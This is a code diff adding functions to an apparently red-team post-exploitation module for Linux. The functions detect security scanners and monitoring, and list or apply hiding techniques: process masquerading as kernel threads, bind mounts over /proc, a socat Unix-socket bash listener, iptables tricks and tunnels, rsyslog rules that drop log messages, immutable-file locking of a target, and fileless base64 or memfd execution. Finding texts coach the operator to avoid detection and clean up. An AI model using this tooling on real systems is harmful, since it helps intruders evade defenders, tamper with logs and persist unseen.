@@ -377,3 +377,359 @@ echo "  ln -s /etc/apparmor.d/profile /etc/apparmor.d/disable/  # Disable on boo
 
   return { output: output.join("\n"), findings }
 }
+
+export async function rootkitDetect(args: string[], timeout: number): Promise<HookResult> {
+  const findings: Finding[] = []
+  const output: string[] = ["=== Security Scanner Detection ==="]
+
+  const script = `
+echo "--- Installed Security Scanners ---"
+for tool in rkhunter chkrootkit tripwire aide osqueryd ossec-control wazuh-control fail2ban-client lynis; do
+  if command -v "$tool" >/dev/null 2>&1; then
+    echo "[!] DETECTED: $tool"
+  fi
+done
+
+echo ""
+echo "--- Security Scanner Processes ---"
+ps aux 2>/dev/null | grep -iE "(rkhunter|chkrootkit|tripwire|aide|osquery|ossec|wazuh|clamd|clamscan|fail2ban|lynis)" | grep -v grep
+
+echo ""
+echo "--- Scanner Databases ---"
+ls -la /var/lib/tripwire/ /var/lib/aide/ /var/ossec/ /var/osquery/ /etc/rkhunter.conf 2>/dev/null
+ls -la /var/lib/rkhunter/db/ 2>/dev/null | head -5
+
+echo ""
+echo "--- Scanner Cron Jobs ---"
+grep -r "rkhunter\|chkrootkit\|tripwire\|aide\|lynis" /etc/cron* /var/spool/cron/ 2>/dev/null
+
+echo ""
+echo "--- Last Scan Results ---"
+cat /var/log/rkhunter.log 2>/dev/null | tail -5
+cat /var/log/chkrootkit.log 2>/dev/null | tail -5
+`
+
+  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
+  output.push(r.stdout || r.stderr)
+
+  const detected = (r.stdout.match(/DETECTED:/g) || []).length
+  if (detected > 0) {
+    findings.push({
+      checkId: "LNX-ROOTKIT-001",
+      provider: "linuxhook",
+      severity: "INFO",
+      status: "IDENTIFIED",
+      resource: "security_scanners",
+      title: `${detected} security scanner(s) installed`,
+      details: "Security scanners detected — artifacts may be discovered by scheduled scans. Clean up before leaving.",
+      remediation: "Ensure security scanners run regularly with up-to-date databases.",
+    })
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
+export async function processHide(args: string[], timeout: number): Promise<HookResult> {
+  const findings: Finding[] = []
+  const output: string[] = ["=== Process Hiding ==="]
+
+  const script = `
+echo "--- Current Process ---"
+echo "PID: $$"
+echo "CMD: $(cat /proc/$$/cmdline 2>/dev/null | tr '\\0' ' ')"
+
+echo ""
+echo "--- Mount Namespace Info ---"
+ls -la /proc/self/ns/mnt 2>/dev/null
+cat /proc/self/mountinfo 2>/dev/null | grep proc | head -5
+
+echo ""
+echo "--- Process Hiding Techniques ---"
+echo "1. Mount namespace (requires root):"
+echo "   unshare -m bash"
+echo "   mount -o bind /dev/null /proc/\$PID/cmdline"
+echo ""
+echo "2. Rename via exec (in bash):"
+echo "   exec -a '[kworker/0:1]' bash  # Masquerade as kernel thread"
+echo ""
+echo "3. LD_PRELOAD hook (hide from ps):"
+echo "   Inject shared library that filters readdir() on /proc/"
+echo ""
+echo "4. Background with nohup:"
+echo "   nohup command > /dev/null 2>&1 &"
+
+echo ""
+echo "--- Existing Hidden Processes ---"
+ls -d /proc/[0-9]* 2>/dev/null | wc -l
+echo "processes in /proc"
+ps aux 2>/dev/null | wc -l
+echo "processes in ps output"
+echo "(Large discrepancy may indicate hidden processes)"
+`
+
+  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
+  output.push(r.stdout || r.stderr)
+
+  findings.push({
+    checkId: "LNX-HIDE-001",
+    provider: "linuxhook",
+    severity: "MEDIUM",
+    status: "IDENTIFIED",
+    resource: "processes",
+    title: "Process hiding techniques assessed",
+    details: "Process hiding methods documented — use mount namespace or exec rename to avoid detection",
+    remediation: "Monitor for mount namespace changes. Use kernel-level process monitoring (auditd, eBPF).",
+  })
+
+  return { output: output.join("\n"), findings }
+}
+
+export async function fileHide(args: string[], timeout: number): Promise<HookResult> {
+  const findings: Finding[] = []
+  const output: string[] = ["=== File Hiding ==="]
+  const target = argVal(args, "--target")
+
+  const script = `
+echo "--- File Hiding Techniques ---"
+echo "1. Dotfile: mv file .file"
+echo "2. Extended attributes: setfattr -n user.hidden -v true file"
+echo "3. Immutable: chattr +i file  (prevents deletion even by root)"
+echo "4. Append-only: chattr +a file"
+echo "5. Bind mount: mount -o bind /dev/null /path/to/file"
+echo "6. /dev/shm: Store in tmpfs (RAM only, lost on reboot)"
+
+echo ""
+echo "--- Hidden Files in Common Dirs ---"
+find /tmp /var/tmp /dev/shm -name ".*" -type f 2>/dev/null | head -20
+
+echo ""
+echo "--- Files with Extended Attributes ---"
+find /tmp /var/tmp -exec getfattr -d {} \; 2>/dev/null | grep -B1 "user\\." | head -20
+
+echo ""
+echo "--- Immutable Files ---"
+lsattr /tmp/ /var/tmp/ /dev/shm/ 2>/dev/null | grep "i" | head -10
+
+${target ? `
+echo ""
+echo "--- Hiding ${target} ---"
+if [ -f "${target}" ]; then
+  chattr +i "${target}" 2>/dev/null && echo "[+] Set immutable attribute on ${target}"
+  echo "[*] File is now protected from deletion"
+fi
+` : ""}
+`
+
+  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
+  output.push(r.stdout || r.stderr)
+
+  if (target && r.stdout.includes("[+] Set immutable")) {
+    findings.push({
+      checkId: "LNX-HIDE-002",
+      provider: "linuxhook",
+      severity: "MEDIUM",
+      status: "EXPLOITED",
+      resource: target,
+      title: "File hidden with immutable attribute",
+      details: `${target} set immutable — cannot be deleted or modified without chattr -i`,
+      remediation: "Monitor for chattr usage. Use file integrity monitoring.",
+    })
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
+export async function networkHide(args: string[], timeout: number): Promise<HookResult> {
+  const findings: Finding[] = []
+  const output: string[] = ["=== Network Connection Hiding ==="]
+
+  const script = `
+echo "--- Current Connections ---"
+ss -tnp 2>/dev/null | head -20
+
+echo ""
+echo "--- Network Hiding Techniques ---"
+echo "1. iptables owner match (drop RST to hide from ss):"
+echo "   iptables -A OUTPUT -p tcp --tcp-flags RST RST -m owner --uid-owner \$(id -u) -j DROP"
+echo ""
+echo "2. Unix domain socket C2 (invisible to netstat/ss):"
+echo "   socat UNIX-LISTEN:/tmp/.hidden.sock,fork EXEC:/bin/bash"
+echo ""
+echo "3. Raw socket (bypass TCP/UDP stack):"
+echo "   python3 -c 'import socket; s=socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)'"
+echo ""
+echo "4. ICMP tunnel (hide in ping traffic):"
+echo "   Use icmpsh or ptunnel for covert channels"
+echo ""
+echo "5. DNS tunnel (hide in DNS queries):"
+echo "   Use iodine or dnscat2"
+
+echo ""
+echo "--- Existing Suspicious Connections ---"
+ss -tnp 2>/dev/null | grep -vE "(:22|:80|:443|:53|LISTEN)" | head -10
+
+echo ""
+echo "--- Unix Domain Sockets ---"
+ss -xlp 2>/dev/null | grep -E "(@|/tmp/|/dev/shm)" | head -10
+`
+
+  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
+  output.push(r.stdout || r.stderr)
+
+  findings.push({
+    checkId: "LNX-NETHIDE-001",
+    provider: "linuxhook",
+    severity: "MEDIUM",
+    status: "IDENTIFIED",
+    resource: "network",
+    title: "Network hiding techniques assessed",
+    details: "Multiple network hiding methods available — iptables owner match, Unix sockets, raw sockets, tunneling",
+    remediation: "Deploy network-level monitoring (IDS/IPS). Monitor for unusual iptables rule changes.",
+  })
+
+  return { output: output.join("\n"), findings }
+}
+
+export async function syslogManipulate(args: string[], timeout: number): Promise<HookResult> {
+  const findings: Finding[] = []
+  const output: string[] = ["=== Syslog Manipulation ==="]
+  const facility = argVal(args, "--facility")
+  const pattern = argVal(args, "--pattern")
+
+  const script = `
+echo "--- Syslog Daemon ---"
+ps aux 2>/dev/null | grep -E "(rsyslog|syslog-ng|systemd-journal)" | grep -v grep
+
+echo ""
+echo "--- Rsyslog Configuration ---"
+cat /etc/rsyslog.conf 2>/dev/null | grep -vE "^(#|$)" | head -20
+ls -la /etc/rsyslog.d/ 2>/dev/null
+
+echo ""
+echo "--- Syslog-ng Configuration ---"
+cat /etc/syslog-ng/syslog-ng.conf 2>/dev/null | grep -vE "^(#|$)" | head -20
+
+echo ""
+echo "--- Remote Log Forwarding ---"
+grep -rE "(@|@@)" /etc/rsyslog.conf /etc/rsyslog.d/ 2>/dev/null
+grep -r "destination.*network\|tcp\|udp" /etc/syslog-ng/ 2>/dev/null
+
+echo ""
+echo "--- Manipulation Options ---"
+echo "  echo ':msg, contains, \"${pattern:-pattern}\" ~' > /etc/rsyslog.d/99-filter.conf"
+echo "  systemctl restart rsyslog"
+echo "  (This drops messages matching the pattern)"
+`
+
+  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
+  output.push(r.stdout || r.stderr)
+
+  if (r.stdout.includes("rsyslog") || r.stdout.includes("syslog-ng")) {
+    findings.push({
+      checkId: "LNX-SYSLOG-001",
+      provider: "linuxhook",
+      severity: "HIGH",
+      status: "IDENTIFIED",
+      resource: "syslog",
+      title: "Syslog daemon identified",
+      details: "Syslog service active — configuration can be modified to drop or redirect log messages",
+      remediation: "Protect syslog config with immutable attributes. Monitor for config changes.",
+    })
+  }
+
+  if (r.stdout.includes("@@") || r.stdout.includes("destination")) {
+    findings.push({
+      checkId: "LNX-SYSLOG-002",
+      provider: "linuxhook",
+      severity: "INFO",
+      status: "IDENTIFIED",
+      resource: "syslog",
+      title: "Remote log forwarding detected",
+      details: "Logs are being forwarded to remote server — local log tampering alone will not erase traces",
+      remediation: "Maintain remote log forwarding to a hardened SIEM.",
+    })
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
+export async function stealthCheckLinux(args: string[], timeout: number): Promise<HookResult> {
+  const findings: Finding[] = []
+  const output: string[] = ["=== Stealth Mode Check ==="]
+
+  const script = `
+echo "--- Base64 Execution Test ---"
+result=$(echo 'echo STEALTH_OK' | base64 | base64 -d | bash 2>/dev/null)
+[ "$result" = "STEALTH_OK" ] && echo "[+] base64 execution works" || echo "[-] base64 execution failed"
+
+echo ""
+echo "--- /dev/shm Writability ---"
+if [ -w /dev/shm ]; then
+  echo "[+] /dev/shm is writable (shm stealth available)"
+  df -h /dev/shm 2>/dev/null | tail -1
+  mount 2>/dev/null | grep "shm\|tmpfs" | grep -v cgroup
+else
+  echo "[-] /dev/shm is not writable"
+fi
+
+echo ""
+echo "--- Python3 memfd_create Check ---"
+if command -v python3 >/dev/null 2>&1; then
+  python3 -c "
+import ctypes
+try:
+  libc = ctypes.CDLL('libc.so.6')
+  fd = libc.memfd_create(b'test', 1)
+  if fd >= 0:
+    import os; os.close(fd)
+    print('[+] memfd_create works (memfd stealth available)')
+  else:
+    print('[-] memfd_create returned error')
+except:
+  print('[-] memfd_create not available')
+" 2>/dev/null
+else
+  echo "[-] python3 not available for memfd stealth"
+fi
+
+echo ""
+echo "--- Monitoring Status ---"
+echo -n "auditd: "; systemctl is-active auditd 2>/dev/null || echo "inactive"
+echo -n "rsyslog: "; systemctl is-active rsyslog 2>/dev/null || echo "inactive"
+echo -n "syslog-ng: "; systemctl is-active syslog-ng 2>/dev/null || echo "inactive"
+echo -n "SELinux: "; getenforce 2>/dev/null || echo "not installed"
+echo -n "AppArmor: "; aa-status --enabled 2>/dev/null && echo "enabled" || echo "disabled/not installed"
+echo -n "fail2ban: "; systemctl is-active fail2ban 2>/dev/null || echo "inactive"
+
+echo ""
+echo "--- Recommended Stealth Mode ---"
+if command -v python3 >/dev/null 2>&1; then
+  echo "Best: memfd (fileless execution via python3 memfd_create)"
+elif [ -w /dev/shm ]; then
+  echo "Good: shm (execute from /dev/shm tmpfs, auto-delete)"
+else
+  echo "Basic: base64 (encode commands, hides from process listing)"
+fi
+`
+
+  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
+  output.push(r.stdout || r.stderr)
+
+  const modes: string[] = []
+  if (r.stdout.includes("base64 execution works")) modes.push("base64")
+  if (r.stdout.includes("shm stealth available")) modes.push("shm")
+  if (r.stdout.includes("memfd stealth available")) modes.push("memfd")
+
+  findings.push({
+    checkId: "LNX-STEALTH-001",
+    provider: "linuxhook",
+    severity: "INFO",
+    status: "IDENTIFIED",
+    resource: "stealth",
+    title: `${modes.length} stealth mode(s) available: ${modes.join(", ") || "none"}`,
+    details: `Available stealth modes: ${modes.join(", ") || "none"}. Use --stealth <mode> flag with linuxhook commands.`,
+    remediation: "Mount /dev/shm with noexec. Restrict memfd_create via seccomp. Monitor for encoded command execution.",
+  })
+
+  return { output: output.join("\n"), findings }
+}
